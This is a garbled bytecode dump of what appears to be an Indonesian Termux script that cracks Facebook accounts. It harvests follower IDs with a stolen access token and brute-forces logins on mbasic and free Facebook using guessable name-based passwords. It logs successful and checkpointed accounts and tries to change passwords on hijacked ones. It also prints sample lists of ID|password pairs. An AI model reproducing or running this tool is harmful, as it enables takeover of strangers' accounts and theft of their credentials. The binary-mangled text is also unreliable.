a
    �:�`= �                	   @   s"  d Z dZdZdZdZdZdZdZdZd	Z	d
Z
dZdZdZdZdZdZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlmZ ddlmZ ddlm Z  ddlm!Z! ddlm"Z# ddlm Z$ ddlmZ% ddlm&Z' ddlm(Z( ddlm)Z) ddlZddl*Z*ddlZddlZddlZddlZddl+Z+ddlZddlZddlZddl,Z,ddlZ-ddlZddlm.Z. ddlmZ/ ddlm0Z0 ddlmZ ddlZddlm1Z1 ddlmZ ddl2T e�3� Z4e�!� Z5ej6�7d ��rej6�8d �dk�re9d ��:� �;� Z<g a=g a>g a?e@e�3� �Ad!��ZBe4jCZDe4jEZFe4jGZHd"Zd#Zd$Zd%Zd&Z	d'Zd$ZIed( e d) e d* e ZJed( e d+ e d* e ZKed( e d, e d* e ZLed( e d- e d* e ZMed( e d. e d* e ZNed( e d/ e d* e ZOz�e�Pd0�jQ�;� ZRe�Pd1�jQ�;� ZSeBeRk�rheTd2�UeKd3 eK d4 eK d5 g�� e�"�  zFeSd6v �r�eTeKd7 �f e� d8� neTeKd9 � eTeJd: � e"�  W n* eVeWf�y�   eTeKd; � e"�  Y n0 W n* eVeWf�y   eTeKd; � e"�  Y n0 d<ejX�Y� v �r*d=ZZd=Z[d=Z\d=Z]nd>ZZd>Z[d>Z\d>Z]d?d@� Z^dAdB� Z_dCdD� Z`dEdF� ZadGdH� ZbdIdJ� ZcdKdL� ZddMdN� ZedOdP� ZfdQdR� ZgdSdT� ZhdUdV� ZidWdX� ZjdYdZ� Zkd[d\� Zld]d^� Zmd_d`� Zndadb� Zodcdd� Zpd�dfdg�Zqdhdi� Zrdjdk� Zsdldm� Ztdndo� Zudpdq� Zvdrds� Zwdtdu� Zxd�dwdx�Zydydz� Zzd{d|� Z{d}d~� Z|dd�� Z}d�d�� Z~d�d�� Zd�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�G d�d�� d��Z�e�d�k�re�)d�� ef�  dS )�z[00mz[40mz[44mz[46mz[42mz[45mz[41mz[47mz[43mz[0;94mz[0;92mz[0;96mz[0;91mz[0;95mz[0;93mz[0;97mz[0;90m�    N��ThreadPoolExecutor)�datetime)�sleep)�Session)�exit)�random)�choice)�stdout)�system)�randint)�date��BeautifulSoup)�*�
.useragentz%d-%m-%Yz[0;33mz[0;31mz[0;32mz[0;36mz[0;34mz[0;35m�[�   •�] �!�?�   ••z!!z??z!https://pastebin.com/raw/SNHmCTDFz!https://pastebin.com/raw/exzCY7sM�
zScript Expired
zHUB : 6283143565470
z%FB : https://m.facebook.com/llovexnxx)zServer-AIFCzServer-RATUz
Server-SCPZTESzServer Saat Ini Aktif�   z"Server Saat Ini Sedang MaintenancezSilah Coba Berapa Saat.. !!zMasalah Tidak DiKetahuiZlinuxz[0m� c                 C   s�   t | �dkr tdtt | �� � t |�dkr@tdtt |�� � t | �dkr�t |�dkr�td� ttd t d t d t d � d S )	Nr   z[OK] : z[CP] : r   r   r   �]� No Result Found)�len�print�str�k�p)ZDapuntaZKrahkrah� r"   �*/data/data/com.termux/files/home/SMBF/Z.py�results~   s    r$   c                 C   s�  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d �S d S )!N�	ua_me.txt�rzmbasic.facebook.com�	max-age=0�1�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7��Host�cache-control�upgrade-insecure-requests�
user-agent�accept�accept-encoding�accept-language�https://mbasic.facebook.com/�html.parserr   �dtsg":\{"token":"(.*?)"�input�value�name�email�pass�0�d�Zfb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpass�refererz:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100��data�c_user�success��statusr:   r;   �cookies�
checkpoint�cp�error�rE   r:   r;   ��open�read�requestsr   �headers�update�get�bs4r   �text�join�re�findall�post�listrF   �get_dict�keys�ZemZpas�hosts�uar&   r!   �bZmetarA   �iZpor"   r"   r#   �mbasic�   s6    

��r`   c                 C   s�  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d �S d S )!Nr%   r&   zfree.facebook.comr'   r(   r)   r*   r+   r,   zhttps://free.facebook.com/r5   r   r6   r7   r8   r9   r:   r;   r<   r=   r>   r?   z8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8z|https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r@   rB   rC   rD   rG   rH   rI   rJ   rK   r[   r"   r"   r#   �f_fb�   s6    

��ra   c                 C   s�   d}t �tjdt� | d�jd�}|jddd�D ]R}d|�d	�v r.tjd
|�d	� | t� d� tjdt� | d�j}d|�� v r.d}q.|dkr�dS td� d S )NFz(https://mbasic.facebook.com/language.php�rO   rF   r5   �aT)�hrefZid_IDrd   r4   )rF   rO   z'https://mbasic.facebook.com/profile.phpzapa yang anda pikirkan sekarangz[!] Wrong Cookies)	rR   r   rN   rQ   �hdcokrS   �find_all�lowerr   )rF   �fZrrr_   r^   r"   r"   r#   �lang�   s    ri   c                   C   sB   t j�d�r8t j�d�dkr0ttd��� �� �S t�  nt�  d S )Nz.cokr   )	�os�path�exists�getsize�gets_dict_cookiesrL   rM   �strip�logsr"   r"   r"   r#   �
basecookie�   s
    rq   c                  C   s6   t } | ddddd�tj�d| ��| d dd	d
d�
}|S )Nr+   r*   r)   ��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   z	://(.*?)$�/login/?next&ref=dbl&fl&refid=8r'   r(   �!application/x-www-form-urlencoded)
�originr3   r2   r1   r0   r-   r?   r.   r/   �content-type)�hostrT   rR   rU   rV   )r\   r&   r"   r"   r#   re   �   s    .re   c                 C   s~   g }t | �� �D ]b}|d tt| �� ��d krP|�|d d | |d   � q|�|d d | |d   d � qd�|�S )Nr   r   �=�; r   )�	enumeraterZ   r   rX   �appendrT   �rF   �resultr_   r"   r"   r#   �gets_cookies�   s
    <$r~   c              
   C   s�   i }z8| � d�D ]&}|�|� d�d |� d�d i� q|W S    | � d�D ]&}|�|� d�d |� d�d i� qN| Y S 0 d S )N�;rx   r   r   ry   )�splitrP   r|   r"   r"   r#   rn   �   s    $$rn   c                   C   s�   t �d� t�  tt� dt� �� tdtttf � tdttttf � tdttttf � tdttttf � tdttttf � t	�  d S )N�clearzMade By Dapuntaz
%s[%s Choose Country %s]
z%s[%s1%s] %sIndonesiaz%s[%s2%s] %sBangladesh/Indiaz%s[%s3%s] %sPakistanz%s[%s4%s] %sUSA)
rj   r   �banner�jalan�c�qr   r    r!   �choose_countryr"   r"   r"   r#   �country�   s    
r�   c               	   C   s�  t dttttf �} | dv rDttd t d t d t d � �n�| dv r�t�d� d	}z&td
d�}|�|� |��  t	�  W n t
tfy�   t	�  Y n0 �n@| dv r�t�d� d}z&td
d�}|�|� |��  t	�  W n t
tfy�   t	�  Y n0 n�| dv �r^t�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�yZ   t	�  Y n0 n�| dv �r�t�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�y�   t	�  Y n0 n$ttd t d t d t d � d S )Nu   
%s[%s•%s] %sChoose : �r   �
[r   r   � Fill In The Correct�r(   �01zrm -rf .pass.txt�id�	.pass.txt�w��2�02�bd��3�03�pk��4�04�us)r7   r    r!   r   rj   r   rL   �write�close�menu�KeyError�IOError)ZccZcouZctryr"   r"   r#   r�   �   sX    (

















r�   c                 C   s   t �| � d S �N)rj   r   )Zdumr"   r"   r#   �bash+  s    r�   c                   C   s
   t �  d S r�   )r�   r"   r"   r"   r#   �logo-  s    r�   c                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )Nr   g���Q��?)�sysr
   r�   �flush�timer   )�z�er"   r"   r#   r�   0  s    
r�   c            
   
   C   sl  t �d� z<tdd��� } t�d|  �}t�|j�}|d }|d }W n^ t	y� } zFt
td t d t d	 t d
|  �f t�d� t�  W Y d }~n
d }~0 0 t�d�j}t�d��� d }tdd��� }d|v r�d}	n*d|v r�d}	nd|v r�d}	nd|v �r
d}	t �d� t�  t
td t d t d	 t d | � t
td t d t d	 t d | � t
td t d t d	 t d | � t
td t d t d	 t d | � t
td t d t d	 t d t d t � t
td t d t d	 t d  t d! t � t
td t d t d	 t d" t t t � t
td t d# t d	 t d$ t d% � t
td t d& t d	 t d' t d( t d) t d	 � t
td t d* t d	 t d+ t d, t d- t d	 � t
td t d. t d	 t d/ t d, t d) t d	 � t
td t d0 t d	 t d1 t d, t d2 t d	 � t
td t d3 t d	 t d4 � t
td t d5 t d	 t d6 � t
td t d7 t d	 t d8 t d9 t d: t d; � t
td t d< t d	 t d= t d9 t d> t d; � t
td t d? t d	 t d@ t d9 t dA t d; � t�  d S )BNzmkdir Hasil/�	login.txtr&   �,https://graph.facebook.com/me/?access_token=r9   r�   r   r   r   � Error : %sr   zhttps://api.ipify.orgzhttp://ip-api.com/json/r�   r�   �	Indonesiar�   �Bangladesh/Indiar�   �Pakistanr�   �USAr�   r�   z++z Your Name     : z Your ID       : z Your IP       : z Country       : z Premium       : zNo/tidakz Last Updated  : z
16-07-2021z You Join Date : r   z3===================================================�   ⟩⟩r�   z Crack ID From Public/Friend �[ zNot yet updated r�   z Crack ID From Followersz [ zAlready updated r�   z Crack ID From FileListr�   z Checkpoint Detectorz	Menu New �05z View Crack Results�06z Settings User Agent�07z Report �(ZLaporkan�)�08z Donasi z
Please bro�00z Logout zREMOVE TOKEN)rj   r   rL   rM   rN   rQ   �json�loadsrS   �	Exceptionr   r    r!   r�   r   rp   r�   �mr_   �durasi�ur�   �o�choose_menu)
�toket�otwrc   �namar�   r�   Zipr�   �ngr�negarar"   r"   r#   r�   5  sR    
4

((((000,<<<<$$<<<r�   c                  C   s  t td t d t d t d �} | dkrZttd t d t d t d � t�  �n�| d	ksj| d
krtt�  �n�| dks�| dkr�t�  �nt| dks�| dk�rttd t �f t�	d� t
td t d t d t d t � t td t d t d t d t �}t|� �n�| dk�s,| dk�r<t�  t�  �n�| dk�sP| dk�rZt�  �n�| dk�sn| dk�r�t�	d� t�  �n�| dk�s�| dk�r�t�  �nb| dk�s�| dk�r�t
td � t
td  � t�d!� t�	d"� t�d!� t�  �n| d#k�r:td$t� d%t� d&t� d't� d(t� d)t� d*t� d+t� d,�� n�| d-k�sN| d.k�r�z8t
td t d t d t d/ � t�	d0� t�  W nN t�y� } z4ttd t d t d t d1|  � W Y d }~n
d }~0 0 n*ttd t d t d t d2 � t�  d S )3Nr�   r   r   �
 Choose : r   r   r   r�   r(   r�   r�   r�   r�   r�   z#FILE UNTUK DIHACK YANG TERSEDIA -->z	ls *.jsonr   z*Masukan Nama Filenya.. Contoh : Risky.jsonz Nama File : r�   r�   �5r�   �6r�   �rm -rf ua_me.txt�7r�   �8r�   zGuna Doanv Kaga Donasi :vz1Anda Akan DiAlih KeGithub Dumai-991 ( READMD.md )�      �?zCxdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.mdZ	FAKEPRINTu�   
[•] Followers ID Target : 53726XXXX
[•] Name : Eliot Cuduco
[•] Total ID : 5000

[1] Api ( Fast )
[2] Mbasic ( Slow )

[•] Choose : 1

[•] Crack Started...
[•] Account [OK] Saved to : OK.txt
[•] Account [×] Saved to : CP.txt

z< [OK] 100037259232339|siti123
 [OK] 100058400629614|ujang123uC  
 [×] 100028447006914|piyon123
 [×] 100025178990640|aila123
 [×] 100044328361757|mesy123
 [×] 100006960191111|ouss12345
 [×] 100014229344949|sasa12345
 [×] 100026905057587|puput12345
 [×] 100018776192587|shaila123
 [×] 100012728401403|nila12345
 [×] 100010124674535|rani12345
 [×] 100014458861212|mbahcemplung123
z  [OK] 100019549012335|akbar12345uy  
 [×] 100020038388267|amir12345
 [×] 100012505441442|nuris123
 [×] 100038464481741|aram12345
 [×] 100055597927243|yuliana123
 [×] 100021522786578|raisa123
 [×] 100006512680343|dwi123
 [×] 100011104141390|alma12345
 [×] 100054324525507|yanti123
 [×] 100066751156637|adan123
 [×] 100016310497928|achmad123
 [×] 100023459116918|penduxs123
 [×] 100036042847438|aldo123
z= [OK] 100004574927001|wandi123
 [OK] 100037100204160|nenih123u}  
 [×] 100023998988274|asepbr123
 [×] 100033654229416|chaca123
 [×] 100002470377268|naen12345
[Crack] 1522/3451 [OK : 3] [CP : 15]
 [×] 100005874422014|winda12345
 [×] 100007227756450|lilis123
 [×] 100023546973075|nayla123
 [×] 100056647249868|upik123
 [×] 100012132816945|hana123
 [×] 100013854549610|andini123
 [×] 100066746546299|rap123
 [×] 100011944244184|etoy12345
z" [OK] 100038875597090|ningsih12345z%
[Crack] 1522/3451 [OK : 5] [CP : 27]r<   r�   z- Terima Kasih Telah Menggunakan Script Kami..�rm -rf login.txtz	 Error %sz Wrong Input)r7   r    r!   r   r�   �publik�followr�   rj   r   r�   r�   �filecoba�
Login_userr   �ress�menu_user_agent�	report_wa�warr�   r   r_   r�   )r&   �dumair�   r"   r"   r#   r�   `  sr    $$


((









��������:$

@$r�   c               
   C   s�   zddd l } dd l } ddlm} ddlm} tj�d�dkrDt�d� tj�d�dkrbt	dd��
�  W n4 ty� } ztdt|� � W Y d }~n
d }~0 0 t�  d S )	Nr   r   r   r}   F�result/cp.txtrc   zERROR : )rN   rR   r   �concurrent.futuresr   rj   rk   rl   �mkdirrL   r�   r�   r   r   �kentodx)rN   r   r   �Er"   r"   r#   r�   �  s    
&r�   c                  C   sh   t d�} | dv r"td� t d�} q| �� dkr4t�  tj�| �dkrXtd�| �� t� S t	| ��
� �� S )NzList File : �r   � zJangan Kosong Kontol�setFzFile {} Ini Tidak DiTemukan)r7   r   rg   �set_uarj   rk   rl   �format�filerL   rM   �
splitlines)Zfailr"   r"   r#   r�   �  s    
r�   c                  C   s�   t tj�d�r&dtd��� ��  d nd� td�} | dv rNt d� td�} q4tdd	��| � t tj�d�rpd
nd� t	d� d S )Nr   z
User Agent Sekarang : r   r   zMasukan User Agent Anda : r�   zKosong Mulu KentodzMasukan User Agent : r�   z
Suksess Ganti User Agentz
Gagal Ganti User AgnetzJalankan Toolsnya Lagi !!)
r   rj   rk   rl   rL   rM   ro   r7   r�   r   )r]   r"   r"   r#   r�   �  s    ,
r�   c               ,   C   s  t �d� tdt� dt� dt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�+� t� } | �rt	�  t
td � tdd��:}| D ]$}|�d�}|�t|d |d � q�W d   � n1 s�0    Y  nttd � d S )Nr�   z
@ zAthour   : zITSUKI AND RISKY
@ zFcaebook : zm.facebook.com/llovexnxx
@ zWhatsapp : zwa.me/6283143565470
@ zGroup FB : zTermux Indonesia
a  ________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
a�               ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
zGunakan �|z Sebagai Pemisah !!r   zHasil zOK z-Detetor Facebook DiSimpan Di : result/ok.txt
zCP z,Detetor Facebook DiSimpan Di : result/cp.txtz1
Login DiMulai
Hasil Loginnya DiSimpan Direquest
�   )Zmax_workersr   r   zMasalah Tidak DiTemukan !!)rj   r   �ngetikr    r�   r_   r!   r�   r�   �select_methodr   r   r�   Zsubmit�eksekusir   r�   )Z	list_akunZsuZakunr"   r"   r#   r�   �  sj    
���������������������

8r�   Tc                 C   s�   | r4t d� t td t d � t td t d � ttd t �}|dv rft td � ttd �}qD|d	krttan*|d
kr�t�dd�ant td � td� d S )Nz
 [ Pilih Method Login ]z1.zFree Facebookz2.zMbasic Facebook
z	Method : r�   zKosong Mulu Ajgr(   r�   Zfreer`   zMasalah Tidak DiTemukanF)	r   r!   r    r7   r_   r�   �url�replacer�   )ZshowZselectr"   r"   r#   r�     s    r�   c              
   C   s�  zt | |�}W n. tjjtjjtjjfy<   t| |� Y n0 |d }d|j�� v r�t	t
d t d t d t d t
 d � t	td t d	�| |� � t	t
d
 � tdd��d�| |�� �n*d|j�� v �r�|j�t�d|d j��d��d�d t�d|d j��d�d d�� t|t|d j��}|dk�r�t	t
d t d t d t d t
 d � t	td t d	�| t� � t	t
d
 � tdd��d�| t�� n�|dk�r t	t
d t d t d t d t
 d � t	td t d	�| |� � t	t
d
 � tdd��d�| |�� nxt	t
d t d t d t d t
 d � t	td �t| |� � t	t
d
 � | td!��� v�r�td!d��d�| |�� nTt	t
d t d t d" t d t
 d � t	td t d	�| |� � t	t
d
 � d S )#Nr   rB   z==============z>>z Login Success z<<z============r�   z {}|{}z)=========================================zresult/ok.txtrc   z{}|{}
rG   z(https://.*?\.facebook.com)r   �//�/checkpoint/)r-   r?   �new passwordz====z Successfully Change Password z===zresult/newpass.txt�no change passwordz=====z Failed to Change Password zresult/no_change.txtz=============z ChackPoints z===========u   ⟩⟩ {}{}|{}r�   z Login Failed ) �	login_risrN   �
exceptions�ConnectionErrorZChunkedEncodingErrorZReadTimeoutr�   rF   rY   r   r�   r�   r_   r�   r�   rL   r�   rO   rP   rU   �searchr�   �groupr�   �tahap1�parserrS   r!   �newpassr    rM   r�   )�username�password�respons�session�responr"   r"   r#   r�     s>    ,H
,
,,,r�   c                 K   s�   t �� }t|�td �j�}t|d�}|�| |d�� d|v rD|d= |j�t�	d�d ddt
d	d
ddtd td�
� |jtt|� |d�}||fS )Nrs   Zsign_up)r:   r;   Z_fb_noscriptr�   r   r'   r(   rt   z|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r*   r+   )
r-   r.   r/   r0   rv   r1   r2   r3   r?   ru   r@   )rN   r�   r�   rQ   r�   rS   �get_datarP   rO   r�   �	useragentrW   �
get_action)r�   r�   �kwargsr�   �parsingr�   r"   r"   r#   r�   <  s    
0r�   c                 C   s�   t |d�}d|v r�|d= z,| j| jd �d�d t|� |d�j}W n tjjy^   d}Y n0 d	|v std
|�	� v r�t
| t|��S d| j�� v r�dS d S )N�"submit[logout-button-with-confirm]zsubmit[Yes]z
submit[No]r?   r�   r   r@   �kontol�password_newzbuat kata sandi barurB   r�   )r�   rW   rO   r�   r�   rS   rN   r�   ZTooManyRedirectsrg   �tahap2r�   rF   rY   )r�   r�   r�   r�   r"   r"   r#   r�   G  s    
,
r�   c                 C   sV   t |d�}|�dti� | j| jd �d�d t|� |dd�}d|j�� v rRd	S d S )
Nr   r  r?   r�   r   F)rA   Zallow_redirectsrB   r�   )	r�   rP   r�   rW   rO   r�   r�   rF   rY   )r�   r�   r�   r�   r"   r"   r#   r  T  s
    
(r  c                 K   sB   | � dddd��D ]*}||d v r&qq|�|d |d i� q|S )Nr7   T)r9   r8   r9   r8   )rf   rP   )r�   Zkecualir�   Zlnputr"   r"   r#   r�   [  s    r�   c                 C   s   | � dddi�d S )NZform�methodrW   Zaction)�find)r�   r"   r"   r#   r�   a  s    r�   c                 C   s
   t | d�S )Nr5   r   )Zhtmlr"   r"   r#   r�   d  s    r�   �����Mb`?c                 C   s0   | d D ]"}t j�|� t j��  t|� qd S )Nr   )r�   r
   r�   r�   r   )ZkataZjum�xr"   r"   r#   r�   g  s    
r�   c                  C   s*   t �d�j�� } d|  }t�d| � d S )NzDhttps://raw.githubusercontent.com/Dumai-991/App-Dumai991/main/no.txtzhttps://wa.me/z	am start )rN   rQ   rS   ro   rj   r   )Zurl_waZapi_war"   r"   r#   r�   l  s    r�   c                   C   s
   t �  d S r�   )r�   r"   r"   r"   r#   �Get_Uav  s    r  c                  C   sL  zt dd��� } W �n& t�y:   t�d� t�d� d}d}d}t�  tt� d�� tt� d	�� tt	� d
�� tt	� d�t
 � ttd t
 d t d t
 d t d t d t d � ttd t
 d t d t
 d � ttd t
 d t d t
 d � ttd t
 d t d t
 d � td�}|dk�sJ|dk�rrt�d� t dd�}|�|� |��  n�|dk�s�|dk�r�t�d� t dd�}|�|� |��  n�|dk�s�|dk�r�t�d� t dd�}|�|� |��  nL|dk�s�|dk�r.t�d� td�}t dd�}|�|� |��  ntd � Y n0 tt	d! � d S )"Nr%   r&   r�   r�   z�Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36z�Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]zUser Agent BrokenzCreated By Riskyz,Silahkan Pilih User Agent Untuk DiGunakan !!z"Please Select A User Agent To Use
r   r�   r   z Made by Risky z( ZRecommendedz )r�   z Made by Dapuntar�   z Made by Anggar�   z Change User Agentz	Choose : r(   r�   r�   r�   r�   zLogin Your User Agent User : zFailed to ChoosezJalankan Lagi Toolsnya :))rL   rM   r�   rj   r   r�   r�   �bulatr   r�   r!   r    r_   r7   r�   r�   r   )r�   Zua_risZua_angZua_dam�vZppxZxxr"   r"   r#   r�   y  sR    

<$$$















r�   c              
   C   s�   zt dd��� }W nF tyX   ttd t d t d t d � t�d� t�  Y n0 zFg }| �	dd	�}ttd
 t d t d t dt
|�  � t|�W S  ty� } z4ttd
 t d t d t d|  � W Y d }~n
d }~0 0 d S )Nr�   r&   r�   r   r   � Cookie/Token Invalidr�   r�   �_r   r   � Total ID : %sr�   )rL   rM   r�   r   r    r!   rj   r   rp   r�   r   �
pilihcrackr�   r   )�riskyr�   r�   �qqr�   r"   r"   r#   r�   �  s    $
,
r�   c                  C   s�   t �d� t�  tt� d�� tt� d�� tt� d��} | dv rJt�  n�| dksZ| dkrbt	�  n�| dksr| d	krzt
�  nn| d
ks�| dkr�t�  nV| dks�| dkr�t�  n>| dks�| dkr�t�  n&| dks�| dkr�t�  ntd� t�  d S )Nr�   �*Ketik ( menu ) Untuk Kembali KeMenu Utamanz'Silahkan Pilih Mau Dump ID !! [ 1 - 5 ]z	Jumlah : )r   r�   z  r(   r�   r�   r�   r�   r�   r�   r�   r�   r�   ZMENUr�   Zwrong)rj   r   r�   r   r�   r�   r7   r	  r�   �
Follow__01�
Follow__02�
Follow__03�
Follow__04�Khususr�   )r
  r"   r"   r#   r�   �  s*    
r�   c            
   
   C   s�  t td � ttd t d t d t d �} t| �dk rft | dv rJdntd	 � t�d
� t�  q0ttd t d t d t d �}t|�dk r�t | dv r�dntd	 � t�d
� t�  q�t td t d t d t d � ttd t d t d t d �}t|�dk �rbt | dv �r&dntd	 � t�d
� ttd t d t d t d �}�q�z(zRt	�
d|  d t �}t�|j�}ttd t d t d t d |d  � W n^ t�y   ttd t d t d t d � ttd t d t d t � t�  Y n0 t	�
d| d | d t �}t�|j�}ttd�}|d D ]>}t�|d d |d  � |�|d d |d  d � �qT|��  ttd t d t d t dtt�  � �znzRt	�
d| d t �}t�|j�}ttd t d t d t d |d  � W n| t�y�   ttd t d t d t d � ttd t d t d t � t�  t	�
d| d | d t �}Y n0 t�|j�}ttd�}|d D ]>}t�|d d |d  � |�|d d |d  d � �q�|��  ttd t d t d t dtt�  � tt�W W S  t�y� }	 z6t td  � t td! � ttd" � t�  W Y d }	~	n
d }	~	0 0 W nP t�y� }	 z6t td  � t td# � ttd" � t�  W Y d }	~	n
d }	~	0 0 d S )$N�Made by Risky And Dumai-991r   r   r   � Followers ID Target 01 : �   r�   �	Kosong ??�Masukan 7 Angka !!r�   � Followers ID Target 02 : � Recommended For 1500 Dump ID� Jumlah Dump Per-ID : �   �https://graph.facebook.com/�?access_token=� Name : r9   r   � ID Not Found�
[ �Back� ]�/subscribers?limit=�&access_token=�a+rA   r�   �<=>r   r  �Maaf Masalah Tidak DiKetahui�Maaf Masalah Terhadap Id 02�Press Enter !!�Maaf Masalah Terhadap Id 01)r�   r�   r7   r    r!   r   r�   r   r  rN   rQ   r�   r�   r�   rS   r   r�   r�   rL   r  r�   r{   r�   r�   r  r�   r�   )
�idt�idt2�max_id�jok�opr&   r�   �ysrc   r�   r"   r"   r#   r  �  s|    $
$
$$
(0$ 
",0$ $
", r  c               
   C   s<  t td � ttd t d t d t d �} t| �dk rft | dv rJdntd	 � t�d
� t�  q0ttd t d t d t d �}t|�dk r�t |dv r�dntd	 � t�d
� t�  q�ttd t d t d t d �}t|�dk �rt |dv �rdntd	 � t�d
� t�  q�t td t d t d t d � ttd t d t d t d �}t|�dk �r�t |dv �r�dntd � t�d
� ttd t d t d t d �}�qfzt	dd��
� }W nl t�y>   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z�zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W n^ t�y�   ttd t d t d t d � ttd t d t d t � t�  Y n0 t�d|  d  | d! | �}g }t�|j�}	|d" d# �d$d%�}
t	|
d&�}|	d' D ]>}|�|d( d) |d  � |�|d( d) |d  d* � �qJ|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n| t�yd   ttd t d t d t d � ttd t d t d t � t�  t�d| d  | d! | �}Y n0 t�|j�}	t	|
d+�}|	d' D ]>}|�|d( d) |d  � |�|d( d) |d  d* � �q�|��  �zpzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n| t�y�   ttd t d t d t d � ttd t d t d t � t�  t�d| d  | d! | �}Y n0 t�|j�}	t	|
d+�}|	d' D ]>}|�|d( d) |d  � |�|d( d) |d  d* � �q�|��  ttd t d t d t d,t|�  � t|
�W W W S  t�y� } z6t td- � t td. � ttd/ � t�  W Y d }~n
d }~0 0 W nP t�y� } z6t td- � t td0 � ttd/ � t�  W Y d }~n
d }~0 0 W nP t�y6 } z6t td- � t td1 � ttd/ � t�  W Y d }~n
d }~0 0 d S )2Nr  r   r   r   r  r  r�   r  r  r�   r  � Followers ID Target 03 : r  r  r  �Masukan 3 Angka !!r�   r&   r�   r   r  � Cookie/Token Rusakr�   r   r!  r"  r9   r#  r$  r%  r&  r'  r(  �
first_name�.jsonr�   r  r�   rA   r�   r*  r   r)  r  r+  �Maaf Masalah Terhadap Id 03r-  r,  r.  )r�   r�   r7   r    r!   r   r�   r   r  rL   rM   r�   r   rj   r   rp   rN   rQ   r�   r�   rS   r�   r�   r�   r{   r�   r�   r  r�   r�   )r/  r0  �idt3r1  r�   r2  r3  r&   r�   r�   r  r4  rc   r�   r"   r"   r#   r  
  s�    $
$
$
$$
($$
0$ 
"0$ $
"0$ $
",  r  c               
   C   s�
  t d� tt� d�� ttd t d t d t d �} t| �dk rpt | dv rTd	ntd
 � t�d� t	�  q:ttd t d t d t d �}t|�dk r�t |dv r�d	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r(t |dv �rd	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r�t |dv �rjd	ntd
 � t�d� t	�  �qLttd t d t d t d �}t|�dk �r�t |dv �r�d	ntd
 � t�d� t	�  �q�t td t d t d t d � ttd t d t d t d �}t|�dk �r�t |dv �rNd	ntd � t�d� ttd t d t d t d �}�q0zt
dd��� }W nl t�y   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z,zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W n^ t�y�   ttd t d t d t d � ttd  t d! t d" t � t�  Y n0 t�d|  d# | d$ | �}	g }
t�|	j�}|d% d& �d'd(�}t
|d)�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �q|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
